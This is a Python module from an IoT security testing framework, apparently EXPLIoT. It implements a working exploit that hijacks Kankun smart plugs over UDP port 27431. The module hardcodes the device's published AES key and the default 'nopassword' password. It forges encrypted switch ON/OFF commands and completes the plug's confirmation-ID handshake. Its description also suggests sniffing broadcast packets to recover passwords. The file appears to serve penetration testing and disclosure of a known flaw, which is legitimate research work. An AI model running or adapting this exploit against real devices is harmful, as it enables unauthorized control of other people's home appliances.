"""Support for hijacking a Kankun smart plug."""
import re
import socket

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

from expliot.core.tests.test import TCategory, Test, TLog, TTarget


# pylint: disable=bare-except
class KHijack(Test):
    """Tests for Kankun smart plugs."""

    def __init__(self):
        """Initialize the test."""
        super().__init__(
            name="hijack",
            summary="Kankun Smart Plug Hijacker",
            descr="This test case connects to the Kankun smart plug and sends"
            "unauthorized switch ON/OFF commands to it. If you don't "
            "know the password, try with the default or sniff the network "
            "for UDP packets as the commands containing the password are "
            "broadcasted. You can decrypt the packets easily using the AES "
            "key which is published.",
            author="Aseem Jakhar and Sneha Rajguru",
            email="aseemjakhar@gmail.com",
            ref=["https://payatu.com/hijacking-kankun/"],
            category=TCategory(TCategory.UDP, TCategory.SW, TCategory.EXPLOIT),
            target=TTarget("kankun", "1.0", "ikonke.com"),
        )

        self.argparser.add_argument(
            "-r", "--rhost", required=True, help="IP address of Kankun smart plug"
        )
        self.argparser.add_argument(
            "-p",
            "--rport",
            default=27431,
            type=int,
            help="Port number of the smart plug service. Default is 27431",
        )
        self.argparser.add_argument(
            "-m",
            "--rmac",
            required=True,
            help="MAC address of Kankun smart plug. Use colon delimited format "
            "with hex digits in small letters, e.g., ff:ee:dd:00:01:02",
        )
        self.argparser.add_argument(
            "-w",
            "--passwd",
            default="nopassword",
            help="The password (if any) for Kankun smart plug. Default is the string 'nopassword'",
        )
        self.argparser.add_argument(
            "-c",
            "--cmd",
            required=True,
            help="The command to send to the smart plug. Valid commands are on/off",
        )

        self.key = b"fdsl;mewrjope456fds4fbvfnjwaugfo"

    def encrypt_decrypt(self, string, encrypt=True):
        """
        Encrypt/Decrypt a string using the known AES key of the smart plug.

        :param string: The string to encrypt or decrypt
        :param encrypt: True means encrypt (default), false means decrypt
        :return: The encrypted/decrypted string
        """
        string = str.encode(string)
        cipher = Cipher(
            algorithms.AES(self.key), modes.ECB(), backend=default_backend()  # nosec
        )

        if encrypt is True:
            padder = padding.PKCS7(algorithms.AES.block_size).padder()
            padded_string = padder.update(string)
            padded_string += padder.finalize()

            encryptor = cipher.encryptor()
            cipher_text = encryptor.update(padded_string) + encryptor.finalize()
            return cipher_text

        decryptor = cipher.decryptor()
        decrypted_text = decryptor.update(string) + decryptor.finalize()

        unpadder = padding.PKCS7(128).unpadder()
        data = unpadder.update(decrypted_text)
        clear_text = data + unpadder.finalize()
        return clear_text

    def send_receive(self, ip_address, port, message):
        """
        Send and then receive encrypted data to/from the smart plug.

        :param ip: The IP address of the smart plug
        :param port: The port number of the listening service
        :param message: The plaintext message
        :return: The response received from the smart plug
        """
        response = None
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.connect((ip_address, port))
            sock.settimeout(20)
            sock.send(self.encrypt_decrypt(message))
            response = sock.recv(1024)
            response = self.encrypt_decrypt(response, encrypt=False)
        except:  # noqa: E722
            TLog.fail("Couldn't receive/decrypt response")
        finally:
            sock.close()
        return response

    def create_message(self, command, cid=None):
        """
        Create the command message to be sent to the the smart plug.

        :param command: The command to send - open/close/confirm
        :param cid: The confirmation ID used in confirm command
        :return: The command message
        """
        message = "lan_phone%{}%{}".format(self.args.rmac, self.args.passwd)

        if command == "open":
            message = "{}%open%request".format(message)
        elif command == "close":
            message = "{}%close%request".format(message)
        elif command == "confirm":
            message = "{}%confirm#{}%request".format(message, cid)
        return message

    @staticmethod
    def get_confirm_id(message):
        """
        Extract the confirmation ID from the response message.

        :param message: The response message
        :return: The confirmation ID
        """
        # Get the confirmation ID number only!!
        confirmation_id = re.search(r"confirm#(\w+)", message.decode("utf-8"))
        if confirmation_id is not None:
            return confirmation_id.group(1)

        return None

    def execute(self):
        """Execute the test."""
        TLog.generic(
            "Sending unauthorized command ({}) to Kankun smart plug on ({}) port ({})".format(
                self.args.cmd, self.args.rhost, self.args.rport
            )
        )
        print(
            "--cmd ({}) cmd is on? ({})".format(self.args.cmd, (self.args.cmd == "on"))
        )

        if self.args.cmd.lower() == "on":
            operation = "open"
        elif self.args.cmd.lower() == "off":
            operation = "close"
        else:
            self.result.setstatus(
                passed=False, reason="Unknown --cmd ({})".format(self.args.cmd)
            )
            return
        message = self.create_message(operation)
        TLog.trydo("Sending {} command: ({})".format(operation, message))
        # Step 1: Send command and receive the confirmation ID response
        response = self.send_receive(self.args.rhost, self.args.rport, message)

        if response is None:
            self.result.setstatus(
                passed=False,
                reason="Communication error while sending message({})".format(message),
            )
            return

        TLog.success("Received response: ({})".format(response.decode("utf-8")))
        # Get the confirmation ID
        cid = self.get_confirm_id(response)

        if cid is None:
            self.result.setstatus(
                passed=False,
                reason="Couldn't extract confirmation ID from ({})".format(response),
            )
            return

        TLog.success("Received confirmation ID: ({})".format(cid))
        message = self.create_message("confirm", cid)
        TLog.trydo("Sending confirm command: ({})".format(message))

        # Step 2: Send confirmation command with the confirmation ID and receive ACK response
        response = self.send_receive(self.args.rhost, self.args.rport, message)
        if response is None:
            self.result.setstatus(
                passed=False,
                reason="Communication error while sending message({})".format(message),
            )
            return
        TLog.success("Received response: ({})".format(response.decode("utf-8")))
